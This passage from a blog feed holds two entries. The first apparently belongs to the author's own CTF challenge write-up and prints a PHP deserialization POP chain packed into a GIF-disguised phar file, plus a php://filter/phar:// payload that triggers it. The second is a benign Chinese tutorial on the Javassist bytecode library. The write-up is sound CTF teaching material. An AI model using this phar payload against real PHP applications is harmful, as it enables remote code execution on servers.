class="string">&quot;size&quot;</span>] &lt; <span class="number">204800</span>) &amp;&amp; <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$fileTmpName</span>)) &#123;</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$fileError</span> === <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="variable">$fileContent</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fileTmpName</span>);</span><br><span class="line">               <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./uploads/temp.log&quot;</span>, <span class="string">&quot;koishi like this:&quot;</span> . <span class="variable">$fileContent</span>);</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1 style=&#x27;color: sandybrown&#x27;&gt;koishi like this!!!&lt;/h1&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1 style=&#x27;color: red&#x27;&gt;badbad, koishi hate!&lt;/h1&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1 style=&#x27;color: red&#x27;&gt;badbad, koishi hate!&lt;/h1&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<p>所以我们需要进行简单的绕过，最终构造的pop链如下：</p>
<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$Neepu</span> = <span class="keyword">new</span> <span class="title class_">Neepu</span>();</span><br><span class="line"><span class="variable">$Shruti</span> = <span class="keyword">new</span> <span class="title class_">Shruti</span>();</span><br><span class="line"><span class="variable">$NewYear</span> = <span class="keyword">new</span> <span class="title class_">NewYear</span>();</span><br><span class="line"><span class="variable">$Koishi</span> = <span class="keyword">new</span> <span class="title class_">Koishi</span>();</span><br><span class="line"><span class="variable">$Obsolescent</span> = <span class="keyword">new</span> <span class="title class_">Obsolescent</span>();</span><br><span class="line"><span class="variable">$Neepu</span>-&gt;n = <span class="variable">$Shruti</span>;</span><br><span class="line"><span class="variable">$Shruti</span>-&gt;r = <span class="variable">$NewYear</span>;</span><br><span class="line"><span class="variable">$NewYear</span>-&gt;nYear = <span class="variable">$Koishi</span>;</span><br><span class="line"><span class="variable">$Koishi</span>-&gt;kk = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="variable">$Koishi</span>-&gt;ii = <span class="keyword">array</span>(<span class="string">&quot;b&quot;</span>);</span><br><span class="line"><span class="variable">$Koishi</span>-&gt;ss = <span class="variable">$Obsolescent</span>;</span><br><span class="line"><span class="variable">$Obsolescent</span>-&gt;o = <span class="variable">$Neepu</span>;</span><br><span class="line"><span class="variable">$Neepu</span>-&gt;ne = <span class="variable">$NewYear</span>;</span><br><span class="line"><span class="variable">$Neepu</span>-&gt;nee = <span class="string">&quot;ObSOLEScEnt::nOWay&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;success.phar&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) ? <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>) : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;koishi like this:GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$Neepu</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;koishi.txt&quot;</span>,<span class="string">&quot;hello shruti&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>),<span class="title function_ invoke__">strlen</span>(<span class="string">&quot;koishi like this:&quot;</span>));</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$filename</span>&quot;</span>,<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure></div>



<p>检查文件类型时需要包含 Ko1sh1 内容，由于filter对于过滤器的处理不严格，当过滤器存在异常内容时只会出现 Warming 提示，而不会终止程序，而mime_content_type也支持伪协议，所以最终我们使用的payload如下。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/Ko1sh1/resource=phar:///tmp/temp.log/koishi.txt</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240208002213628.png"
                      alt="image-20240208002213628"
                ></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>联赛</category>
      </categories>
      <tags>
        <tag>出题</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/03/08/javassist%20%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="javassist-简介"><a href="#javassist-简介" class="headerlink" title="javassist 简介"></a>javassist 简介</h2><p>Javassist (JAVA programming ASSISTant) 是在 Java 中编辑字节码的类库;它使 Java 程序能够在运行时定义一个新类, 并在 JVM 加载时修改类文件。</p>
<p>我们常用到的动态特性主要是反射，在运行时查找对象属性、方法，修改作用域，通过方法名称调用方法等。在线的应用不会频繁使用反射，因为反射的性能开销较大。其实还有一种和反射一样强大的特性，但是开销却很低，它就是Javassit。</p>
<p>与其他类似的字节码编辑器不同, Javassist 提供了两个级别的 API: 源级别和字节码级别。 如果用户使用源级 API, 他们可以编辑类文件, 而不知道 Java 字节码的规格。 整个 API 只用 Java 语言的词汇来设计。 您甚至可以以源文本的形式指定插入的字节码; Javassist 在运行中编译它。 另一方面, 字节码级 API 允许用户直接编辑类文件作为其他编辑器。</p>
<h2 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h2><p>可以把它理解成加强版的<code>Class</code>对象，需要从<code>ClassPool</code>中获得。</p>
<p>获得方法：<code>CtClass cc = cp.get(ClassName)</code>。</p>
<p><strong>AbstractClass.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>InterfaceClass.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InterfaceClass</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show2</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>CtClass_Learn.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Bean.AbstractClass;</span><br><span class="line"><span class="keyword">import</span> Bean.InterfaceClass;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CtClass_Learn</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractClass.class));</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(InterfaceClass.class));</span><br><span class="line"><span class="comment">//        // 新建类</span></span><br><span class="line"><span class="comment">//        CtClass ctClass = pool.makeClass(&quot;Ko1sh1&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        // 设置父类为抽象类</span></span><br><span class="line"><span class="comment">//        CtClass superClass = pool.get(AbstractClass.class.getName());</span></span><br><span class="line"><span class="comment">//        ctClass.setSuperclass(superClass);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 上两步可直接合成为：</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Ko1sh1&quot;</span>,pool.get(AbstractClass.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建抽象 show 方法并添加</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void show()&#123;String name=\&quot;koishi\&quot;;System.out.println(name);&#125;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过 CtClass 的方式获取接口并添加方法</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">interfaceCtClass</span> <span class="operator">=</span> pool.makeInterface(InterfaceClass.class.getName());</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">interface_method</span> <span class="operator">=</span> CtNewMethod.abstractMethod(CtClass.voidType, <span class="string">&quot;show2&quot;</span>, <span class="literal">null</span>,<span class="literal">null</span>, interfaceCtClass);</span><br><span class="line">        interfaceCtClass.addMethod(interface_method);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 再为原本的类添加一个接口</span></span><br><span class="line">        ctClass.addInterface(interfaceCtClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 接口实现抽象方法的方式与抽象类的函数相同</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void show2() &#123; System.out.println(\&quot;Implemented method\&quot;); &#125;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addMethod(method);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保存class文件</span></span><br><span class="line"><span class="comment">//        String savePath = &quot;src/main/java/class_repository/Bean/class_repository&quot;;</span></span><br><span class="line"><span class="comment">//        ctClass.writeFile(savePath);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成实例化对象</span></span><br><span class="line"><span class="comment">//        ctClass.toClass().newInstance();</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">instance_class</span> <span class="operator">=</span> ctClass.toClass();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> instance_class.newInstance();</span><br><span class="line">        ((AbstractClass)instance).show();</span><br><span class="line">        ((InterfaceClass)instance).show2();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 类冻结</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ctClass.toClass();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (javassist.CannotCompileException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;已调用 writeFile(), toClass(), toBytecode() 方法转换成一个类文件，此 CtClass 对象已被冻结，不允许再修改&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 解冻</span></span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            method = CtNewMethod.make(<span class="string">&quot;public void show3() &#123; System.out.println(\&quot;HAHA! I&#x27;m fine again\&quot;); &#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addMethod(method);</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                instance = ctClass.toClass().newInstance();</span><br><span class="line">                instance.getClass().getMethod(<span class="string">&quot;show3&quot;</span>).invoke(instance);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (javassist.CannotCompileException ex)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;解冻后，即使可以修改class内容，但是也不能再重新实例化了&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对上面的代码选取部分进行解释：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractClass.class));</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(InterfaceClass.class));</span><br></pre></td></tr></table></figure></div>

<p>创建了 ClassPool 对象，并调用了 insertClassPath 方法。因为通过 ClassPool.getDefault() 获取的 ClassPool 使用 JVM 的类搜索路径。如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 可能无法找到用户的类，因为 Web 服务器使用多个类加载器作为系统类加载器。在这种情况下，ClassPool 必须添加额外的类搜索路径（在该测试 java 文件中，可以不写这两行，因为默认加载器能找到）。</p>
<p>insertClassPath 也可以注册一个目录作为类搜索路径。下面的例子将 &#x2F;classes 添加到类搜索路径中</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">pool.insertClassPath(<span class="string">&quot;./classes&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>类搜索路径不但可以是目录，还可以是 URL ：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">ClassPath</span> <span class="variable">cp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassPath</span>(<span class="string">&quot;www.javassist.org&quot;</span>, <span class="number">80</span>, <span class="string">&quot;/java/&quot;</span>, <span class="string">&quot;org.javassist.&quot;</span>);</span><br><span class="line">pool.insertClassPath(cp);</span><br></pre></td></tr></table></figure></div>

<p>上述代码将 <code>http://www.javassist.org:80/java/</code> 添加到类搜索路径。并且这个URL只能搜索 <code>org.javassist</code> 包里面的类。例如，为了加载 <code>org.javassist.test.Main</code>，它的类文件会从<code>http://www.javassist.org:80/java/org/javassist/test/Main.class</code> 获取。</p>
<p>随后新建了 Ko1sh1 类，同时设置其父类为 AbstractClass</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Ko1sh1&quot;</span>,pool.get(AbstractClass.class.getName()));</span><br></pre></td></tr></table></figure></div>

<p>与下面的代码等效</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Ko1sh1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置父类为抽象类</span></span><br><span class="line"><span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractClass.class.getName());</span><br><span class="line">ctClass.setSuperclass(superClass);</span><br></pre></td></tr></table></figure></div>



<p>javassist 中当 CtClass 对象调用 writeFile(), toClass(), toBytecode() 方法时，会转换成一个类文件，此 CtClass 对象已被冻结，不允许再修改，再次调用会产生报错。对于被冻结的 CtClass 对象，可以使用 defrost() 进行解冻，调用 defrost() 之后，此 CtClass 对象又可以被修改了（可以修改，但是不能再次加载进 JVM 中了，一个类只能被加载一次，比如实例化操作就无法再次进行了）。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">        <span class="comment">// 生成实例化对象</span></span><br><span class="line"><span class="comment">//        ctClass.toClass().newInstance();</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">instance_class</span> <span class="operator">=</span> ctClass.toClass();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> instance_class.newInstance();</span><br><span class="line">        ((AbstractClass)instance).show();</span><br><span class="line">        ((InterfaceClass)instance).show2();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 类冻结</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ctClass.toClass();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (javassist.CannotCompileException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;已调用 writeFile(), toClass(), toBytecode() 方法转换成一个类文件，此 CtClass 对象已被冻结，不允许再修改&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 解冻</span></span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            method = CtNewMethod.make(<span class="string">&quot;public void show3() &#123; System.out.println(\&quot;HAHA! I&#x27;m fine again\&quot;); &#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addMethod(method);</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                instance = ctClass.toClass().newInstance();</span><br><span class="line">                instance.getClass().getMethod(<span class="string">&quot;show3&quot;</span>).invoke(instance);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (javassist.CannotCompileException ex)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;解冻后，即使可以修改class内容，但是也不能再重新实例化了&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>

<p>除此以外，ClassPool.doPruning 属性值为 true 时，在冻结 CtClass 时，会修剪 CtClass 的数据结构。为了减少内存的消耗，修剪操作会丢弃 CtClass 对象中不必要的属性。例如，Code_attribute 结构会被丢弃。修剪过的 CtClass 对象不能再次被解冻。ClassPool.doPruning 的默认值为 false。</p>
<p>也可通过下面的代码驳回裁剪</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cc.stopPruning(true);</span><br></pre></td></tr></table></figure></div>



<h2 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h2><p>ClassPool 是 CtClass 对象的容器。因为编译器在编译引用 CtClass 代表的 Java 类的源代码时，可能会引用 CtClass 对象，所以一旦一个 CtClass 被创建，它就被保存在 ClassPool 中。简单来说，这就是个容器，存放的是<code>CtClass</code>对象。</p>
<p>如果 CtClass 对象的数量变得非常大（这种情况很少发生，因为 Javassist 试图以各种方式减少内存消耗），ClassPool 可能会导致巨大的内存消耗。 为了避免此问题，可以从 ClassPool 中显式删除不必要的 CtClass 对象。 如果对 CtClass 对象调用 detach()，那么该 CtClass 对象将被从 ClassPool 中删除。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> ... ;</span><br><span class="line">cc.writeFile();</span><br><span class="line">cc.detach();</span><br></pre></td></tr></table></figure></div>

<p>在调用 detach() 之后，就不能调用这个 CtClass 对象的任何方法了。但是如果你调用 ClassPool 的 get() 方法，ClassPool 会再次读取这个类文件，创建一个新的 CtClass 对象。</p>
<p>由于 ClassPool.getDefault() 是为了方便而提供的单例工厂方法，它保留了一个<code>ClassPool</code>的单例并重用它。所以创建的新的 ClassPool 替换旧的 ClassPool，并将旧的 ClassPool 丢弃。除该方法以外，还可通过 <code>new ClassPool(true)</code> 构造一个 ClassPool 对象。</p>
<h3 id="级联的-ClassPools"><a href="#级联的-ClassPools" class="headerlink" title="级联的 ClassPools"></a>级联的 ClassPools</h3><p>如果程序正在 Web 应用程序服务器上运行，则可能需要创建多个 ClassPool 实例; 应为每一个 ClassLoader 创建一个 ClassPool 的实例。 程序应该通过 ClassPool 的构造函数，而不是调用 getDefault() 来创建一个 ClassPool 对象。<br> 多个 ClassPool 对象可以像 java.lang.ClassLoader 一样级联。 例如，</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">parent</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">child</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPool</span>(parent);</span><br><span class="line">child.insertClassPath(<span class="string">&quot;./classes&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>如果调用 child.get()，子 ClassPool 首先委托给父 ClassPool。如果父 ClassPool 找不到类文件，那么子 ClassPool 会尝试在 .&#x2F;classes 目录下查找类文件。如果 child.childFirstLookup 设置为 true，那么子类 ClassPool 会在委托给父 ClassPool 之前尝试查找类文件。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">parent</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">child</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPool</span>(parent);</span><br><span class="line">child.appendSystemPath();         <span class="comment">// the same class path as the default one.</span></span><br><span class="line">child.childFirstLookup = <span class="literal">true</span>;    <span class="comment">// changes the behavior of the child.</span></span><br></pre></td></tr></table></figure></div>



<h3 id="拷贝一个已经存在的类来定义一个新的类"><a href="#拷贝一个已经存在的类来定义一个新的类" class="headerlink" title="拷贝一个已经存在的类来定义一个新的类"></a>拷贝一个已经存在的类来定义一个新的类</h3><div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = pool.<span class="keyword">get</span>(<span class="string">&quot;Point&quot;</span>);</span><br><span class="line">cc.setName(<span class="string">&quot;Pair&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>这个程序首先获得类 Point 的 CtClass 对象。然后它调用 setName() 将这个 CtClass 对象的名称设置为 Pair。在这个调用之后，这个 CtClass 对象所代表的类的名称 Point 被修改为 Pair。类定义的其他部分不会改变。</p>
<p>因此，如果后续在 ClassPool 对象上再次调用 get(“Point”)，则它不会返回变量 cc 所指的 CtClass 对象。 而是再次读取类文件 Point.class，并为类 Point 构造一个新的 CtClass 对象。 因为与 Point 相关联的 CtClass 对象不再存在。示例：</p>
<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = pool.<span class="keyword">get</span>(<span class="string">&quot;Point&quot;</span>);</span><br><span class="line">CtClass cc1 = pool.<span class="keyword">get</span>(<span class="string">&quot;Point&quot;</span>);   <span class="comment">// cc1 is identical to cc.</span></span><br><span class="line">cc.setName(<span class="string">&quot;Pair&quot;</span>);</span><br><span class="line">CtClass cc2 = pool.<span class="keyword">get</span>(<span class="string">&quot;Pair&quot;</span>);    <span class="comment">// cc2 is identical to cc.</span></span><br><span class="line">CtClass cc3 = pool.<span class="keyword">get</span>(<span class="string">&quot;Point&quot;</span>);   <span class="comment">// cc3 is not identical to cc.</span></span><br></pre></td></tr></table></figure></div>

<p>cc1 和 cc2 指向 CtClass 的同一个实例，而 cc3 不是。 注意，在执行 cc.setName(“Pair”) 之后，cc 和 cc1 引用的 CtClass 对象都表示 Pair 类。</p>
<p>除了上面的内容，还需要注意，一旦一个 CtClass 对象被 writeFile() 或 toBytecode() 转换为一个类文件，Javassist 会拒绝对该 CtClass 对象的进一步修改。因此，在表示 Point 类的 CtClass 对象被转换为类文件之后，不能将 Pair 类定义为 Point 的副本，在 Point 上执行 setName() 将会被拒绝。 以下代码段是错误的：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;Point&quot;</span>);</span><br><span class="line">cc.writeFile();</span><br><span class="line">cc.setName(<span class="string">&quot;Pair&quot;</span>);    <span class="comment">// wrong since writeFile() has been called.</span></span><br></pre></td></tr></table></figure></div>

<p>为了避免这种限制，应该在 ClassPool 中调用 getAndRename() 方法。 例如：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;Point&quot;</span>);</span><br><span class="line">cc.writeFile();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc2</span> <span class="operator">=</span> pool.getAndRename(<span class="string">&quot;Point&quot;</span>, <span class="string">&quot;Pair&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>如果调用 getAndRename()，ClassPool 首先读取 Point.class 来创建一个新的表示 Point 类的 CtClass 对象。 而且，它会在这个 CtClass 被记录到哈希表之前，将 CtClass 对象重命名为 Pair。因此，getAndRename() 可以在表示 Point 类的 CtClass 对象上调用 writeFile() 或 toBytecode() 后执行。</p>
<h2 id="类加载器-Class-Loader"><a href="#类加载器-Class-Loader" class="headerlink" title="类加载器 (Class Loader)"></a>类加载器 (Class Loader)</h2><p>在Java中，多个类加载器可以共存，每个类加载器创建自己的名称空间。不同的类加载器可以加载具有相同类名的不同类文件。加载的两个类被视为不同的类。此功能使我们能够在单个 JVM 上运行多个应用程序，即使这些程序包含具有相同名称的不同的类。</p>
<p>JVM 不允许动态重新加载类。一旦类加载器加载了一个类，它不能在运行时重新加载该类的修改版本。</p>
<p>如果相同的类文件由两个不同的类加载器加载，则 JVM 会创建两个具有相同名称和定义的不同的类。由于两个类不相同，一个类的实例不能被分配给另一个类的变量。两个类之间的转换操作将失败并抛出一个 ClassCastException。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">MyClassLoader</span> <span class="variable">myLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassLoader</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> myLoader.loadClass(<span class="string">&quot;Box&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> clazz.newInstance();</span><br><span class="line"><span class="type">Box</span> <span class="variable">b</span> <span class="operator">=</span> (Box)obj;    <span class="comment">// this always throws ClassCastException.</span></span><br></pre></td></tr></table></figure></div>

<p>上述代码将报错，因为 Box 由默认的 classloader 加载，obj 是通过自定义的 classloader 加载的，强制转换将产生报错</p>
<h3 id="javassist-Loader"><a href="#javassist-Loader" class="headerlink" title="javassist.Loader"></a>javassist.Loader</h3><p>Javassit 提供一个类加载器 javassist.Loader。它使用 javassist.ClassPool 对象来读取类文件。<br> 例如，javassist.Loader 可以用于加载用 Javassist 修改过的类。</p>
<h4 id="类加载前"><a href="#类加载前" class="headerlink" title="类加载前"></a>类加载前</h4><p><strong>FatherBean.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FatherBean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FatherBean</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FatherBean</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>SimpleBean.java</strong></p>
